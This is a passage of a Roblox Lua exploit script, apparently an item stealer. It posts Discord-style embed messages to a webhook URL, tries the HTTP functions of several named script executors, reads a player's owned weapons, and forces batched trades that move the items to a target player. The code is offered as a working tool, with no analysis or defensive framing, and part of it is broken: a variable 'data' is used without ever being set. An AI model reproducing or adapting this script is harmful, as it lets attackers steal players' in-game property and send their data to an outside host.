    }

    local payloadData = { embeds = {embed} }
    if pingEveryone then
        payloadData.content = "@everyone "
    end

    local jsonPayload = HttpService:JSONEncode(payloadData)

    -- Detect HTTP function (works on Delta, Synapse, Krnl, Wave, etc.)
    local httpFunc = nil
    pcall(function() if request then httpFunc = request end end)
    pcall(function() if not httpFunc and http_request then httpFunc = http_request end end)
    pcall(function() if not httpFunc and syn and syn.request then httpFunc = syn.request end end)
    pcall(function() if not httpFunc and http and http.request then httpFunc = http.request end end)

    if not httpFunc then
        pcall(function()
            HttpService:PostAsync(WEBHOOK_URL, jsonPayload, Enum.HttpContentType.ApplicationJson)
        end)
        return
    end

    local ok, res = pcall(httpFunc, {
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonPayload
    })

    if ok and type(res) == "table" then
        if res.StatusCode == 200 or res.StatusCode == 204 then
            -- success
        else
            -- status
        end
    elseif ok then
        -- response
    else
        -- failed
    end
end

-- ======= GET INVENTORY FROM SERVER =======
local function getOwnedWeapons(player)
    local owned = nil
    pcall(function()
        local remotes = ReplicatedStorage:FindFirstChild("Remotes")
        if remotes and remotes.Inventory then
            local getProfile = remotes.Inventory:FindFirstChild("GetProfileData")
            if getProfile then

                if data and data.Weapons and data.Weapons.Owned then
                    owned = data.Weapons.Owned
                end
            end
        end
    end)
    return owned or {}
end

-- Keywords that automatically mark an item as ignored (catches variants)
local ignoreKeywords = {
    "default", "normal", "stock"
}

local function isIgnored(itemName)
    local lowerName = itemName:lower()
    -- First, check exact matches
    for _, ignoreName in ipairs(ignoreList) do
        if lowerName == ignoreName then
            return true
        end
    end
    -- Then check if the name contains any ignore keyword
    for _, keyword in ipairs(ignoreKeywords) do
        if lowerName:find(keyword) then
            return true
        end
    end
    return false
end

-- ======= IMPROVED TRADE FUNCTIONS (unchanged) =======
local function acceptTrade()
    local trade = ReplicatedStorage:FindFirstChild("Trade")
    if not trade then return false end
    local accept = trade:FindFirstChild("AcceptTrade")
    if not accept then return false end

    local attempts = {
        function() accept:FireServer() end,
        function() accept:FireServer(true) end,
        function() accept:FireServer(1) end,
        function() accept:FireServer({Accepted = true}) end,
    }
    for _, attempt in ipairs(attempts) do
        if pcall(attempt) then return true end
    end
    return false
end

local function doTrade(targetName, tradableItems)
    local target = Players:FindFirstChild(targetName)
    if not target then
        return
    end

    local trade = ReplicatedStorage:FindFirstChild("Trade")
    if not trade then
        local Remotes = ReplicatedStorage:FindFirstChild("Remotes")
        local tradeRequestRemote = Remotes and (Remotes:FindFirstChild("TradeRequest") or Remotes:FindFirstChild("RequestTrade"))
        local tradeAcceptRemote  = Remotes and (Remotes:FindFirstChild("TradeAccept") or Remotes:FindFirstChild("AcceptTrade"))
        local addItemRemote      = Remotes and (Remotes:FindFirstChild("AddItemToTrade") or Remotes:FindFirstChild("AddItem"))
        local confirmRemote      = Remotes and (Remotes:FindFirstChild("ConfirmTrade") or Remotes:FindFirstChild("Confirm"))

        if not (tradeRequestRemote and tradeAcceptRemote and addItemRemote and confirmRemote) then
            return
        end

        local function oldForceTradeBatch(batch)
            tradeRequestRemote:FireServer(target.Name)
            wait(0.3)
            tradeAcceptRemote:FireServer(target.Name)
            wait(0.2)
            for _, item in ipairs(batch) do
                addItemRemote:FireServer(item.category, item.name, item.count)
                wait(0.1)
            end
            wait(0.3)
            confirmRemote:FireServer(target.Name)
            wait(0.5)
        end

        while #tradableItems > 0 do
            local batch = {}
            for i = 1, math.min(4, #tradableItems) do
                table.insert(batch, table.remove(tradableItems, 1))
            end
            oldForceTradeBatch(batch)
            wait(0.3)
        end
        return
    end

    local sendReq = trade:FindFirstChild("SendRequest")
    local getStatus = trade:FindFirstChild("GetTradeStatus")
    local offer = trade:FindFirstChild("OfferItem")

    if not (sendReq and getStatus and offer) then
        return
    end

    while #tradableItems > 0 do
        local status = "None"
        pcall(function() status = getStatus:InvokeServer() end)

        if status == "None" then
            pcall(function() sendReq:InvokeServer(target) end)
        elseif status == "StartTrade" then
            local batch = {}
            for i = 1, math.min(4, #tradableItems) do
                table.insert(batch, table.remove(tradableItems, 1))
            end
            for _, item in ipairs(batch) do
                local offered = false
                local attempts = {
                    function() offer:FireServer(item.name, item.category) end,
                    function() offer:FireServer(item.name, "Weapons") end,
                    function() offer:FireServer(item.name, item.count) end,
                    function() offer:FireServer(item.name) end,
                }
                for _, attempt in ipairs(attempts) do
                    if pcall(attempt) then
                        offered = true
                        break
                    end
                end
                if not offered then
                    -- failed to offer
                end
                task.wait(0.1)
            end
            task.wait(1)
            acceptTrade()
            task.wait(0.5)
        end
        task.wait(0.5)
    end
end
